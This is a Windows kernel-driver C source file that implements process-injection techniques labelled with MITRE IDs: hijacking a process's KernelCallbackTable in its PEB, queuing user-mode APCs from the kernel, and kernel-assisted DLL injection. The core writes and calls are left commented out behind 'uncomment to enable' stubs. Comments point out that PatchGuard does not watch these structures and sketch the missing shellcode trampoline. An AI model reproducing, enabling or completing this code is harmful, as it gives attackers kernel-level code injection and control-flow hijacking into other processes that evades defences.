#include "injection.h"
#include "ntstructs.h"
#include <ntddk.h>

/* -----------------------------------------------------------------------
 * Undocumented kernel API types for APC injection
 * ----------------------------------------------------------------------- */

typedef enum _KAPC_ENVIRONMENT
{
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment
} KAPC_ENVIRONMENT;

typedef VOID (NTAPI *PKNORMAL_ROUTINE)(
	IN PVOID NormalContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
);

typedef VOID (NTAPI *PKKERNEL_ROUTINE)(
	IN struct _KAPC *Apc,
	IN OUT PKNORMAL_ROUTINE *NormalRoutine,
	IN OUT PVOID *NormalContext,
	IN OUT PVOID *SystemArgument1,
	IN OUT PVOID *SystemArgument2
);

typedef VOID (NTAPI *PKRUNDOWN_ROUTINE)(
	IN struct _KAPC *Apc
);

/* Undocumented but exported by ntoskrnl */
NTKERNELAPI VOID KeInitializeApc(
	IN PRKAPC            Apc,
	IN PRKTHREAD         Thread,
	IN KAPC_ENVIRONMENT  Environment,
	IN PKKERNEL_ROUTINE  KernelRoutine,
	IN PKRUNDOWN_ROUTINE RundownRoutine  OPTIONAL,
	IN PKNORMAL_ROUTINE  NormalRoutine   OPTIONAL,
	IN KPROCESSOR_MODE   ApcMode,
	IN PVOID             NormalContext   OPTIONAL
);

NTKERNELAPI BOOLEAN KeInsertQueueApc(
	IN PRKAPC     Apc,
	IN PVOID      SystemArgument1,
	IN PVOID      SystemArgument2,
	IN KPRIORITY  Increment
);

NTKERNELAPI BOOLEAN KeTestAlertThread(
	IN KPROCESSOR_MODE AlertMode
);

/*
 * PEB offset of KernelCallbackTable.
 *
 * PEB layout (x64):
 *   +0x000  InheritedAddressSpace
 *   +0x001  ReadImageFileExecOptions
 *   +0x002  BeingDebugged
 *   +0x003  BitField
 *   +0x008  Mutant
 *   +0x010  ImageBaseAddress
 *   +0x018  Ldr
 *   +0x020  ProcessParameters
 *   +0x028  SubSystemData
 *   +0x030  ProcessHeap
 *   +0x038  FastPebLock
 *   +0x040  AtlThunkSListPtr
 *   +0x048  IFEOKey
 *   +0x050  CrossProcessFlags
 *   +0x058  KernelCallbackTable / UserSharedInfoPtr (union)
 *
 * Stable since Windows Vista x64.
 */
#define PEB_KERNEL_CALLBACK_TABLE_OFFSET  0x58

/* -----------------------------------------------------------------------
 * T3 — KernelCallbackTable Hijack (MITRE T1574.013)
 *
 * The KernelCallbackTable is an array of function pointers in the PEB
 * that win32k.sys calls back into user mode through (e.g., for window
 * message processing, clipboard operations). Overwriting an entry
 * redirects control flow when that callback fires.
 *
 * This operates on user-mode memory (PEB), so a crash only affects
 * the target process, not the kernel.
 *
 * PatchGuard does NOT monitor PEB contents.
 * IRQL: PASSIVE_LEVEL (requires KeStackAttachProcess).
 * ----------------------------------------------------------------------- */
NTSTATUS KmHijackCallbackTable(
	IN  HANDLE   ProcessId,
	IN  ULONG    TableIndex,
	IN  ULONG64  NewFunction,
	OUT PULONG64 PreviousFunction
)
{
	PEPROCESS  Process = NULL;
	NTSTATUS   Status;
	KAPC_STATE ApcState;
	PPEB       Peb;

	if ( !PreviousFunction )
		return STATUS_INVALID_PARAMETER;

	*PreviousFunction = 0;

	/* Sanity check — KernelCallbackTable typically has < 200 entries */
	if ( TableIndex > 256 )
		return STATUS_INVALID_PARAMETER;

	Status = PsLookupProcessByProcessId( ProcessId, &Process );
	if ( !NT_SUCCESS( Status ) )
		return Status;

	Peb = PsGetProcessPeb( Process );
	if ( !Peb )
	{
		ObDereferenceObject( Process );
		return STATUS_NOT_FOUND;
	}

	KeStackAttachProcess( Process, &ApcState );

	__try
	{
		/* Read the KernelCallbackTable pointer from PEB+0x58 */
		PVOID*   TablePtr = *(PVOID**)( (PUCHAR)Peb + PEB_KERNEL_CALLBACK_TABLE_OFFSET );
		PULONG64 Entry;

		if ( !TablePtr )
		{
			Status = STATUS_NOT_FOUND;
			__leave;
		}

		Entry = (PULONG64)( &TablePtr[TableIndex] );

		/* Read old value */
		*PreviousFunction = (ULONG64)*Entry;

		/*
		 * Overwrite the callback table entry.
		 * When win32k.sys invokes callback at this index, control
		 * transfers to NewFunction in user mode.
		 *
		 * The swap is a single pointer-width write, naturally atomic.
		 */
		/* TODO: Uncomment to enable callback table hijack */
		/* *Entry = (ULONG64)NewFunction; */

		UNREFERENCED_PARAMETER( NewFunction );
		Status = STATUS_NOT_IMPLEMENTED;
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		Status = GetExceptionCode();
	}

	KeUnstackDetachProcess( &ApcState );
	ObDereferenceObject( Process );
	return Status;
}

/* -----------------------------------------------------------------------
 * APC kernel routine — frees the KAPC allocation after delivery.
 * This MUST be in nonpaged memory (it is, as driver code).
 * ----------------------------------------------------------------------- */
static VOID ApcKernelRoutine(
	IN struct _KAPC *Apc,
	IN OUT PKNORMAL_ROUTINE *NormalRoutine,
	IN OUT PVOID *NormalContext,
	IN OUT PVOID *SystemArgument1,
	IN OUT PVOID *SystemArgument2
)
{
	UNREFERENCED_PARAMETER( NormalRoutine );
	UNREFERENCED_PARAMETER( NormalContext );
	UNREFERENCED_PARAMETER( SystemArgument1 );
	UNREFERENCED_PARAMETER( SystemArgument2 );

	/* Free the KAPC struct that was allocated from NonPagedPool */
	ExFreePoolWithTag( Apc, 'NdBf' );
}

/* -----------------------------------------------------------------------
 * APC rundown routine — called if the thread terminates before the
 * APC fires. Must free the KAPC allocation to prevent pool leaks.
 * ----------------------------------------------------------------------- */
static VOID ApcRundownRoutine(
	IN struct _KAPC *Apc
)
{
	ExFreePoolWithTag( Apc, 'NdBf' );
}

/* -----------------------------------------------------------------------
 * T8 — Kernel APC Injection (MITRE T1055.004)
 *
 * Queues a user-mode APC to a target thread. When the thread enters
 * an alertable wait state (WaitForSingleObjectEx, SleepEx, etc.),
 * the APC fires and executes ApcRoutine(ApcArgument) in user mode.
 *
 * The APC routine address must already exist in the target process's
 * address space (e.g., allocated via KmWriteProcessMemory or pointing
 * to an existing function like ntdll!LdrLoadDll).
 *
 * CRITICAL SAFETY NOTE (from WinDev review):
 * - KAPC must be allocated from NonPagedPool
 * - KAPC must NOT be freed until the APC fires or is run down
 * - If the driver unloads with pending APCs, the kernel calls into
 *   unmapped memory = BSOD. A production implementation MUST use
 *   reference counting and block DriverUnload until all APCs complete.
 *
 * PatchGuard does NOT monitor APC queues.
 * IRQL: KeInsertQueueApc raises to DISPATCH_LEVEL internally.
 * ----------------------------------------------------------------------- */
NTSTATUS KmQueueKernelApc(
	IN HANDLE  ProcessId,
	IN ULONG64 ThreadId,
	IN ULONG64 ApcRoutine,
	IN ULONG64 ApcArgument
)
{
	PEPROCESS Process = NULL;
	PETHREAD  Thread  = NULL;
	NTSTATUS  Status;
	PRKAPC    Apc     = NULL;

	Status = PsLookupProcessByProcessId( ProcessId, &Process );
	if ( !NT_SUCCESS( Status ) )
		return Status;

	Status = PsLookupThreadByThreadId( (HANDLE)ThreadId, &Thread );
	if ( !NT_SUCCESS( Status ) )
	{
		ObDereferenceObject( Process );
		return Status;
	}

	/* Validate thread belongs to the specified process */
	{
		PEPROCESS ThreadOwner = IoThreadToProcess( Thread );
		if ( ThreadOwner != Process )
		{
			ObDereferenceObject( Thread );
			ObDereferenceObject( Process );
			return STATUS_INVALID_PARAMETER;
		}
	}

	/* Allocate KAPC from NonPagedPool — must survive until APC fires */
	Apc = (PRKAPC)ExAllocatePool2( POOL_FLAG_NON_PAGED, sizeof( KAPC ), 'NdBf' );
	if ( !Apc )
	{
		ObDereferenceObject( Thread );
		ObDereferenceObject( Process );
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	/*
	 * Initialize and insert the user-mode APC.
	 *
	 * KeInitializeApc sets up the APC structure:
	 *   - KernelRoutine:  ApcKernelRoutine (frees KAPC, runs at APC_LEVEL)
	 *   - RundownRoutine: ApcRundownRoutine (frees KAPC if thread dies)
	 *   - NormalRoutine:  The user-mode function to call (ApcRoutine)
	 *   - ApcMode:        UserMode (APC fires in user context)
	 *   - NormalContext:   The argument to the user-mode function
	 *
	 * KeInsertQueueApc enqueues it on the thread's APC list.
	 * KeTestAlertThread forces the thread to check its APC queue.
	 */
	/* TODO: Uncomment to enable APC injection */
	/*
	KeInitializeApc(
		Apc,
		(PRKTHREAD)Thread,
		OriginalApcEnvironment,
		ApcKernelRoutine,
		ApcRundownRoutine,
		(PKNORMAL_ROUTINE)(ULONG_PTR)ApcRoutine,
		UserMode,
		(PVOID)(ULONG_PTR)ApcArgument
	);

	if ( !KeInsertQueueApc( Apc, NULL, NULL, IO_NO_INCREMENT ) )
	{
		ExFreePoolWithTag( Apc, 'NdBf' );
		ObDereferenceObject( Thread );
		ObDereferenceObject( Process );
		return STATUS_UNSUCCESSFUL;
	}
	*/

	/* Stub: free the APC since we didn't insert it */
	ExFreePoolWithTag( Apc, 'NdBf' );
	Status = STATUS_NOT_IMPLEMENTED;

	UNREFERENCED_PARAMETER( ApcRoutine );
	UNREFERENCED_PARAMETER( ApcArgument );

	ObDereferenceObject( Thread );
	ObDereferenceObject( Process );
	return Status;
}

/* -----------------------------------------------------------------------
 * T9 — Kernel-Assisted DLL Injection (MITRE T1055.001)
 *
 * Combines memory allocation, DLL path writing, and APC injection
 * to load a DLL into a target process from kernel mode.
 *
 * Steps:
 *   1. Attach to target process
 *   2. Allocate memory for the DLL path (ZwAllocateVirtualMemory)
 *   3. Write the DLL path string into the allocated memory
 *   4. Detach
 *   5. Queue an APC to a thread with NormalRoutine = LdrLoadDll stub
 *
 * LdrLoadDll address must be resolved in the target's ntdll.dll.
 * Since ntdll is mapped at the same base in all processes (ASLR is
 * per-boot, not per-process for ntdll), we can read it from our own
 * process's PEB LDR list or from the target's.
 *
 * Same APC lifecycle warnings as T8 apply.
 * ----------------------------------------------------------------------- */
NTSTATUS KmInjectDll(
	IN  HANDLE   ProcessId,
	IN  PCWSTR   DllPath,
	OUT PULONG64 AllocatedAddress
)
{
	PEPROCESS  Process = NULL;
	NTSTATUS   Status;
	KAPC_STATE ApcState;
	SIZE_T     PathLen;
	SIZE_T     AllocSize;
	PVOID      RemoteBuffer = NULL;

	if ( !DllPath || !AllocatedAddress )
		return STATUS_INVALID_PARAMETER;

	*AllocatedAddress = 0;

	PathLen = wcslen( DllPath );
	if ( PathLen == 0 || PathLen > 260 )
		return STATUS_INVALID_PARAMETER;

	AllocSize = ( PathLen + 1 ) * sizeof( WCHAR );

	Status = PsLookupProcessByProcessId( ProcessId, &Process );
	if ( !NT_SUCCESS( Status ) )
		return Status;

	KeStackAttachProcess( Process, &ApcState );

	__try
	{
		/*
		 * Step 1: Allocate memory in the target process for the DLL path.
		 * ZwAllocateVirtualMemory operates on the current process's address
		 * space — since we're attached, this allocates in the target.
		 */
		/* TODO: Uncomment to enable DLL injection */
		/*
		Status = ZwAllocateVirtualMemory(
			ZwCurrentProcess(),
			&RemoteBuffer,
			0,
			&AllocSize,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_READWRITE
		);

		if ( !NT_SUCCESS( Status ) )
			__leave;

		*//* Step 2: Write the DLL path into the allocated memory *//*
		RtlCopyMemory( RemoteBuffer, DllPath, ( PathLen + 1 ) * sizeof( WCHAR ) );

		*AllocatedAddress = (ULONG64)(ULONG_PTR)RemoteBuffer;
		*/

		/*
		 * Step 3: After detaching, queue an APC to a target thread.
		 * The APC normal routine would be a small shellcode stub that
		 * calls LdrLoadDll with the DLL path, or we can use the
		 * KernelCallbackTable approach to trigger LdrLoadDll indirectly.
		 *
		 * For a complete implementation, you would also need to:
		 * - Resolve ntdll!LdrLoadDll in the target process
		 * - Write a small shellcode trampoline that calls LdrLoadDll(NULL, 0, &path, &handle)
		 * - Queue that trampoline as the APC routine
		 * - The trampoline address would be the ApcRoutine parameter
		 *
		 * This is left as TODO because it combines T8's APC mechanism
		 * with additional shellcode generation complexity.
		 */
		Status = STATUS_NOT_IMPLEMENTED;
	}
	__except ( EXCEPTION_EXECUTE_HANDLER )
	{
		Status = GetExceptionCode();
	}

	KeUnstackDetachProcess( &ApcState );
	ObDereferenceObject( Process );
	return Status;
}
